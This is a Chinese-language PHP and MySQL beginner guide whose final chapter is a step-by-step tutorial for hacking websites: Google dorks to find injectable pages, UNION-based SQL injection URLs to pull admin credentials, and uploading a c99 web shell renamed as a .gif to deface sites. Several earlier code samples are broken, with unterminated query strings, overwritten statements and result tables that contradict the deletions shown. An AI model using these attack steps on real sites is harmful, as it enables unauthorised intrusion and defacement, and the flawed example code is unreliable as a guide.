
# PHP：MySQL & PHP 编程指南 - Web 开发、数据库与黑客

## 引言

有多种用于开发网站的脚本语言，最常用的脚本语言是 PHP。它在开发者中非常受欢迎，因为它提供了其他脚本语言不具备的其他功能。最初 PHP 推出时，它的缩写是超文本预处理器（hypertext preprocessor）。但后来它改为 PHP。脚本语言是解释执行而非编译的语言。它们被用于软件应用程序和嵌入式系统。

网站位于前端，必须与后端连接起来才能形成完整的产品。MySQL 的使用涉及数据库，该数据库取决于数据库中表与表之间的关系。这增加了数据库的可靠性，也提高了检索速度。这种组合无疑将 Web 应用程序推向新的水平。这对用户来说非常有用。有许多包如 Ruby、Drupal 等使用 MySQL 来创建网页。动态网页意味着输出取决于数据。PHP 可以很轻松地执行数学运算。PHP 在初学者和高级编码员之间取得了完美的平衡，因为它对初学者来说易于操作，而对于高级编码员，它提供了许多他们可以用不同方式尝试的高端功能。

## 第一章：MySQL 简介

MySQL 也是一种依赖于表之间关系的开源数据库。因此它被称为关系型数据库管理系统（RDBMS），是仅于 Oracle 之后最流行的数据库。MySQL 有其自身的重要特性：

1. **架构设计**：MySQL 采用客户端/服务器架构，包含一个作为客户端和服务器交互中质的服务器。这种交互可以与多个客户端进行。客户端可以是已连接到服务器以检索数据的应用程序。这些可以分布在多台计算机上，也可以在同一台计算机上运行。可以为各种客户端提供服务器访问。
2. **高速**：由于数据库中的大多数表都是连接的，数据检索可以非常快。这是 MySQL 广受欢迎的一个重要特性。
3. **平台无关**：MySQL 可以运行在多个操作系统上，如 Linux、MAC、UNIX、Windows 等。
4. **SQL 和 MySQL 的高兼容性**：SQL 代表结构化查询语言。它是 MySQL 数据库支持的编程语言。通过结构化查询语言，我们可以创建数据库（即在数据库中创建表）、创建它们的关系，并使用相同的语言处理数据。
5. **支持数据库连接（即 ODBC）**：MySQL 通过数据库连接（ODBC）提供其数据库连接，供计算机操作系统使用的编程语言使用。
6. **二维数据的存在**：许多系统（如地理信息系统）使用 MySQL，因为它支持二维数据。
7. **多种 API 的使用**：API 代表应用程序接口。MySQL 可以许多 API 分别进行开发，这为开发者提供了高度的灵活性。此类应用程序接口包括 C、Java、CPP、Perl、PHP、Python 等，它们也可以作为客户端程序。

PHP 和 MySQL 是高度独立的语言，可以结合产生各种惊人的输出。这主要由 Web 开发者完成。在所有 Web 应用程序中，Web 开发者需要处理两个部分：用户界面（也称为前端）和数据库部分（也称为后端）。所以现在很清楚各自扮演什么角色。

因此，PHP 将帮助开发者开发前端，而后端可以使用 MySQL 开发。可以编写许多使用 PHP 执行任务的程序。PHP 对 Web 开发者非常有帮助，因为它具有高度的灵活性。灵活性意味着通过 PHP 代码，开发者可以完成简单的网页显示任务，并检查用户通过 HTML 表单输入的数据。

这些检查具有高价值，因为它们会过滤掉所有不必要的数据，从而有助于与应用程序相关的数据库性能。这为应用程序开发者提供了巨大的优势。PHP MySQL 还可以通过易构建、易访问和易用的高端网页执行简单和复杂的数据处理。

## 第 2 章：使用 PHP 连接 MySQL 数据库

### 编写 PHP

编写 PHP 实际上非常简单，因为你不需要任何软件，除了任何文本编辑器（如 Windows 中的记事本）。如果你运行它，你就可以编写自己的第一个 PHP 脚本。

### 声明 PHP

PHP 脚本被包含在两个 PHP 标签之间。由于由于，你的服务器可以通过这些标签将信息解析为 PHP。代码的不同形式如下：

```php
<?php
PHP Code in Here
?>
<?php
PHP Code in Here
php?>
<script language="php">
PHP Code in Here</script>
```

它们的功能相同，但在这里我将使用第一种选项（`<??>`）。这没有特殊原因；但是，你可以使用任何选项。但记住，代码的开始和结束必须相同的标签（例如，你不能用 `<?php` 开始而用 `</script>` 结束）。

### 打开和关闭连接

从 PHP 打开 MySQL 数据库的连接非常简单。可以使用 `mysqli_connect()` 函数来实现。与旧版本相比，MySQL 系统从 4.1 版本开始有了许多新功能。可以通过新开发的 `mysqli` 扩展来利用这些新功能。`mysqli` 扩展意味着 MySQL 改进扩展。对于 5 及以上的 PHP 版本，MySQL 扩展已经包含在内。

可以通过如下方式从 PHP 打开到 MySQL 连接：

```php
<?php
$dbhost = 'localhost';
$dbuser = 'root';
$dbpass = 'password';
$conn = mysqli_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to MySQL');
$dbname = 'Our_Customers';
mysqli_select_db($dbname);
?>
```

MySQL 服务器的名称是 `$dbhost`。如果 Web 服务器和 MySQL 服务器在同一台机器上，可以使用 `localhost` 或 `127.0.0.1`。`$dbuser` 是有效的 MySQL 用户名，`$dbpass` 是有效的 MySQL 密码。连接到 MySQL 后，永远不要忘记使用 `mysqli_select_db()` 选择数据库。如果你忘记选择数据库，`select` 或 `update` 查询将无法运行。

有时你需要指定 MySQL 服务器的名称和端口号，例如，假设 MySQL 服务器的名称为 `db.xyz.com`。它的端口号为 3306（默认）。那么上面的代码可以修改如下：

```php
<?php
$dbhost = 'db.xyz.com:3306';
$dbuser = 'root';
$dbpass = 'password';
$conn = mysqli_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to MySQL');
$dbname = 'Our_Customers';
mysqli_select_db($dbname);
?>
```

通常，打开数据库连接的例程被单独放在另一个文件中。需要时可以通过包含该文件来打开连接。数据库名称、密码、用户和主机通常单独存储在配置文件中。

一个存储连接配置的 `config.php` 和打开连接的 `opendb.php` 的良好示例如下：

#### 源代码：config.php, opendb.php

```php
<?php
$dbhost = 'localhost';
$dbuser = 'root';
$dbpass = 'password';
$dbname = 'Our_Customers';
?>
<?php
$conn = mysqli_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to MySQL');
mysqli_select_db($dbname);
?>
```

现在，可以如下方式打开到 MySQL 连接：

```php
<?php
include 'config.php';
include 'opendb.php';
?>
```

#### 关闭连接

脚本一旦执行，打开的连接就会关闭。但建议你调用 `mysql_close()` 函数，以便显式地关闭连接。此函数也可以放在 `closeddb.php` 文件中。

源代码：closeddb.php

```php
<?php
// closeddb.php 所做的只是
// 它关闭了 MySQL 数据库连接
mysqli_close($conn);
?>
```

由于打开例程、关闭例程和数据库配置被放在不同的文件中，使用 MySQL 的 PHP 脚本如下所示：

```php
<?php
include 'config.php';
include 'opendb.php';
// 执行 insert, select 等操作
include 'closeddb.php';
?>
```

因此，可以使用 PHP 打开和关闭到 MySQL 连接。

## 第 3 章：使用 PHP 在 MySQL 中创建数据库和表

在用 MySQL 和 PHP 创建并操作特定数据库之前，让我们来看看在 PHP 中与 MySQL 数据库交互而使用的扩展。

PHP 5 及更高版本使用扩展来与 MySQL 数据库交互。它们如下：

1. **MySQLi**
2. **PHP Data Objects (PDO)**

2012 年，MySQL 扩展从 PHP 中移除，尽管它在之前的版本中被使用。MySQLi 和 PDO 都是面向对象的。但 MySQLi 还提供了过程化的应用程序接口。

### 使用 PHP 创建 MySQL 数据库

在 MySQL 中，为了创建数据库，我们使用 `CREATE DATABASE` 语句。

这是一个示例，我们创建一个名为 'Our_Customerers' 的数据库：

#### 示例：使用面向对象的 MySQLi 创建数据库

```php
<?php
$servername = "localhost";
$username = "root";
$password = "password";
// 创建连接
$conn = new mysqli($servername, $username, $password);

// 检查连接
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
// 创建数据库
$sql = "CREATE DATABASE Our_Customerers";
if ($conn->query($sql) === TRUE) {
    echo "Database Our_Customerers created successfully";
} else {
    echo "Error creating database: " . $conn->error;
}
$conn->close();
?>
```

### 使用 PHP 创建 MySQL 表

为了在 MySQL 中创建表，我们使用 `CREATE TABLE` 语句。这里有一个创建 Customers 表的示例：

```php
<?php
$servername = "localhost";
$username = "root";
$password = "password";
// 创建连接
$conn = new mysqli($servername, $username, $password);

// 检查连接
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// 创建表
$sql = "CREATE TABLE Customers (
  id INT(6) NOT NULL AUTO_INCREMENT PRIMARY KEY,
  first_name varchar(30) NOT NULL,
  last_name varchar(30) NOT NULL,
  email varchar(50),
  address varchar(255),
  age int
)";

if ($conn->query($sql) === TRUE) {
    echo "Table created successfully";
} else {
    echo "Error creating table: " . $conn->error;
}

$conn->close();
?>
```

### 什么是数据类型？

数据类型无非数据的表示。数据所属的类型。MySQL 中使用的重要数据类型如下。

| 数据类型 | 用途 |
|---|---|
| `CHAR(y)` | 存储长度为 'y' 的字符。长度是固定的。 |
| `VARCHAR(y)` | 存储长度可为 'y' 的字符。比 CHAR 慢。 |
| `TEXT` | 存储字符串值 65535。 |
| `BLOB` | 存储二进制大对象。总共 65535 字节。 |
| `ENUM(a,b,c...)` | 使用此数据类型输入值列表。共有 65535 个值。 |
| `TINYINT(y)` | 有符号存储 -128 到 127，无符号存储 0 到 255。这里，y 是最大位数。 |
| `SMALLINT(y)` | 存储 -32768 到 32767 之间的数值。这里，y 是最大位数。 |
| `INT(y)` | 存储 -2147483648 到 2147483647 之间的数值。这里，y 是最大位数。 |
| `BIGINT(y)` | 存储 -9223372036854775808 到 9223372036854775807 之间的数值。这里，y 是最大位数。 |
| `DECIMAL(precision,scale)` | 这可以存储大的小数值。可以存储的数字位数称为精度。标无非小数点后放置的数字位数。这里有一个示例：654.123 是一个小数点前 3 位、后 3 位的数字。 |
| `FLOAT(precision,scale)` | 可以存储较小的分数值。精度意味着可以存储的总数字位数。标意味着小数点后的数字位数。 |
| `DATE()` | 此数据类型存储年、月、日格式。 |
| `TIME()` | 存储小时、分、秒格式的时间。 |
| `TIMESTAMP()` | 可以同时存储日期和时间值。 |

可以在指定数据类型后指定列的完整性约束。

- **PRIMARY KEY（主键）**：主键本质上是表中每条记录唯一的值。对于记录而言，主键建立了唯一标识标识。当它应用于列时，它不允许出现空值或重复值。它在表中只能出现一次。
- **NOT NULL（非空）**：不能向列中添加空值。
- **DEFAULT（默认值）**：默认约束将指定列中必须出现的默认值。当没有给定指定值时，将设置该默认值。
- **UNSIGNED（无符号）**：此约束将限制数据存储仅为正整数和零。
- **AUTO INCREMENT（自增）**：这将自动添加新记录并从 1 开始自动增加字段值。

每个表都应该指定一个主键。`customer_id` 列是 `customers` 表中的主键。

下面的示例演示了如何在 PHP 中创建表。

#### 示例：使用面向对象的 mysqli 创建表

```php
<?php
$servername = "localhost";
$username = "username";
$password = "password";
$dbname = "Our_Customers";
// create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
// create table
$sql = "CREATE TABLE Customers (
customer_id INT(7) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
first_name VARCHAR(20) NOT NULL,
last_name VARCHAR(20) NOT NULL,
email_id VARCHAR(60)
);
if ($conn->query($sql) === TRUE) {
    echo "Table Customers successfully created";
} else {
    echo "Error creating table: " . $conn->error;
}
$conn->close();
?>
```

### 使用 PHP 向 MySQL 表中插入数据

#### INSERT INTO 语句

有时我们可能需要向已存在的表中插入数据。我们可以使用 `INSERT INTO` 语句向表中插入新记录。向 MySQL 表插入数据时，有一组规则需要遵守。它们是：

- SQL 查询语句在 PHP 中应该用引号括起来
- 查询内部存在的字符串值应该加引号。
- 数值不应该加引号。
- 单词 NULL 不应该加引号。

以下是插入数据的语法。

```sql
INSERT INTO table_name (column1, column2, column3,...) VALUES (value1, value2, value3,...);
```

在上一章中，我们创建了一个包含 4 列的 "customers" 表。通过 `INSERT INTO` 语句，我们可以向该表添加数据。我们可以使用以下示例。

在上一章中我们创建了一个名为 "Customers" 的表，包含四列，分别为 "customer_id"、"first_name"、"last_name" 和 "email_id"。我们可以使用以下示例向表中输入数据：

#### 示例：使用面向对象的 mysqli 向表插入数据



```php
<?php
$servername = "localhost";
$username = "username";
$password = "password";
$dbname = "Our_Customers";
// create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$sql = "INSERT INTO Customers (first_name, last_name, email_id) VALUES ('pete', 'henry', 'petehenry@gmail.com');";
$sql = "INSERT INTO Customers (first_name, last_name, email_id) VALUES ('shanks', 'Watson', 'shanksWatson@gmail.com');";
$sql = "INSERT INTO Customers (first_name, last_name, email_id) VALUES ('luffy', 'Abrol', 'luffyAbrol@gmail.com');";
if ($conn->query($sql) === TRUE) {
    echo "New record successfully created";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
$conn->close();
?>
```

插入行之后，“Customers” 表看起来如下：

| customer_id | first_name | last_name | email_id |
|---|---|---|---|
| 1 | pete | henry | petehenry@gmail.com |
| 2 | shanks | Watson | shanksWatson@gmail.com |
| 3 | luffy | Abrol | luffyAbrol@gmail.com |

# 第 4 章：使用 PHP 从 MySQL 数据库显示和操作数据

## 使用 PHP 从 MySQL 数据库显示数据

从表中选择数据我们使用 `SELECT` 语句。`SELECT` 语句的语法如下：

```sql
SELECT column1, column2... FROM table_name;
```

我们使用 `*` 字符选择表中的所有列。

```sql
SELECT * FROM table_name;
```

接下来的示例强调了从 "customers" 表选择 `customer_id` 和 `first_name` 列。

示例：使用面向对象的 MySQLi 从表中选择数据：

```php
<?php
$servername = "localhost";
$username = "username";
$password = "password";
$dbname = "Our_Customers";
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT customer_id, first_name FROM customers";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "customer_id: " . $row["customer_id"] . " - first_name: " . $row["first_name"] . "<br>";
    }
} else {
    echo "0 results";
}
$conn->close();
?>
```

## 使用 PHP 从 MySQL 表中删除数据

DELETE：

要从表中删除记录，可以使用 `DELETE` 语句。语法如下：

```sql
DELETE FROM table WHERE condition;
```

只有满足 `WHERE` 子句中指定条件的记录会被删除。

这里是 "customers" 表：

| customer_id | first_name | last_name | email_id |
|---|---|---|---|
| 1 | pete | henry | petehenry@gmail.com |
| 2 | shanks | Watson | shanksWatson@gmail.com |
| 3 | luffy | Abrol | luffyAbrol@gmail.com |

示例：使用面向对象的 mysqli 从表中删除记录：

在下面的示例将删除 `customer_id=2` 的记录

```php
<?php
$servername = "localhost";
$username = "username";
$password = "password";
$dbname = "Our_Customers";
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
// sql to delete a record
$sql = "DELETE FROM Customers WHERE customer_id=2";
if ($conn->query($sql) === TRUE) {
    echo "Record successfully deleted";
} else {
    echo "Error deleting record: " . $conn->error;
}
$conn->close();
?>
```

修改后的 "Customers" 表现在看起来像：

| customer_id | first_name | last_name | email_id |
|---|---|---|---|
| 1 | pete | henry | petehenry@gmail.com |
| 3 | luffy | Abrol | luffyAbrol@gmail.com |

```php
$sql = "UPDATE Customers SET last_name='Ellison',email_id='peteEllison@gmail.com' WHERE customer_id='1';
if ($conn->query($sql) === TRUE) {
    echo "Record successfully updated";
} else {
    echo "Error updating record: " . $conn->error;
}
$conn->close();
?>
```

Customer 表现在看起来如下：

| customer_id | first_name | last_name | email_id |
|---|---|---|---|
| 1 | pete | Ellison | peteEllison@gmail.com |
| 2 | shanks | Watson | shanksWatson@gmail.com |
| 3 | luffy | Abrol | luffyAbrol@gmail.com |

# 第 5 章：使用 SQL 和 PHP 脚本黑入网站

## 什么是 SQL 注入？

SQL 注入是一种著名且广泛使用的黑客方法。这种方法让未经授权的人访问网站数据库。通过这种方式，攻击者可以获取网站数据库中的所有数据。

通过 SQL 注入，攻击者可以：

- 绕过登录
- 修改网站内容
- 访问机密数据
- 关闭 MySQL 服务器

你可以通过以下步骤实现 SQL 注入：

### 步骤 1：寻找有漏洞的网站

你可以借助 Google Dork 列表找到一些有漏洞的网站。Google Dork 利用其搜索技巧不断搜索有漏洞的网站。你可以在 Google 中搜到许多搜索技巧。

在这里，为了寻找有漏洞的网站，我们将使用 `inurl:` 命令。

以下是几个示例：

```
inurl:index.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:pageid=
```

如何使用？

当你复制上述任何命令并将其粘贴到 Google 中时，你将得到一个网站列表。然后你必须通过逐一访问每个网站来检查其是否存在漏洞。

1. 检查漏洞

假设有一个网站是有漏洞的，并且看起来像下面所示：

`http://www.site.com/news.php?id=5`

你可以通过在 URL 末尾添加字符来检查该网站是否有漏洞。例如：

`http://www.site.com/news.php?id=5'`

当你得到类似 "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc..." 或类似的错误消息时，就可以说该网站是有漏洞的。

2. 寻找列数

我们使用 `ORDER BY` 语句来查找列数。我们只需要不断增加数字，直到出现错误为止。

```
http://www.site.com/news.php?id=5 order by 1/* <- 无错误
http://www.site.com/news.php?id=5 order by 2/* <- 没错误
http://www.site.com/news.php?id=5 order by 3/* <- 没错误
http://www.site.com/news.php?id=5 order by 4/* <- 没错误
```

在上面的尝试中，我们在第四次尝试时报错。这意味着它有 3 列。

3. 检查 UNION 函数

为了在单个 SQL 语句中选择更多数据，你可以使用 `UNION` 函数。

`http://www.site.com/news.php?id=5 union all select 1,2,3/*`

（我们已经从上面的部分知道有 3 列）

如果我们在屏幕上看到数字，说明 union 起作用了。

4. 检查 MySQL 版本

现在网站的地址看起来像：`http://www.site.com/news.php?id=5 union all select 1,2,3/*`

假设屏幕上显示数字 2，为了检查版本，我们将数字 2 替换为 `@@version` 或 `version()`。

在添加 `@@version` 后，地址看起来会像这样：`http://www.site.com/news.php?id=5 union all select 1,@@version,3/*`

这将显示类似 `1.1.56-log` 或类似的内容。这就是 MySQL 的版本。

5. 获取表名和列名

在发现 MySQL 版本小于 5 的情况下，你必须猜测表名和列名。

常见的表名有 admin/s、user/s、member/s 等。

常见的列术语有：username, user_name, usr, user, pass, pwd, password 等。

例如：

`http://www.site.com/news.php?id=5 union all select 1,2,3 from admin/*`

如果你仍然能在屏幕上看到数字，说明该表存在。

在这里我们可以通过以下地址检查列名：

`http://www.site.com/news.php?id=5 union all select 1,username,3 from admin/*`

这将通过不断尝试的方法直到找到列名。如果你成功了，你将在屏幕上看到用户名。现在如果你想检查其他列，只需在代码中添加该单词即可：

`http://www.site.com/news.php?id=5 union all select 1,any name,3 from admin/*`

登录后你就可以开始上传图片。使用网站的上传功能，你现在可以将 shell 上传到侧边。

你可以在此处下载 shell：`http://rapidshare.com/files/248023722/c99.rar`

解压 `c99.RAR` 文件得到一个 `c99.php` 文件。上传该 PHP 文件。

某些网站不允许上传 PHP 文件。在这种情况下，你可以将文件重命名为 `c99.php.gif` 然后进行上传。

上传后，访问 `http://www.site.com/images`（在许多网站中，图片将保存在此目录中。如果不是，你将需要猜目录）。

现在找到 `c99.php` 或 `c99.php.gif`。点击它选择该文件。

现在你将看到一个巨大的控制面板。你现在已获得了该网站的访问权限。

你可以用自己的文件替换 `index.html` 文件。

点击注销（logout）以完成你的操作。现在，访问该网站的人也将看到你添加的页面。

通过这种方法，你可以入侵有漏洞的网站并利用它们来显示你的信息。

# 结论

我希望这本书让你对 MySQL 和 PHP 的功能有了基本的了解。这本书还教了你如何让它们高效协作，以生成具有高用户交互性的动态网页，以及如何使用它们来入侵网站。

书中提供了许多带有 MySQL 查询的 PHP 示例程序，以便读者理解 PHP 和 MySQL 是融合并互为补充的。在必要的地方，程序末尾都提供了输出结果，让读者理解程序如何影响数据库。这本书还包含了用于入侵网站的示例代码。

我希望你发现这本书很有益处；感谢你选择这本书。
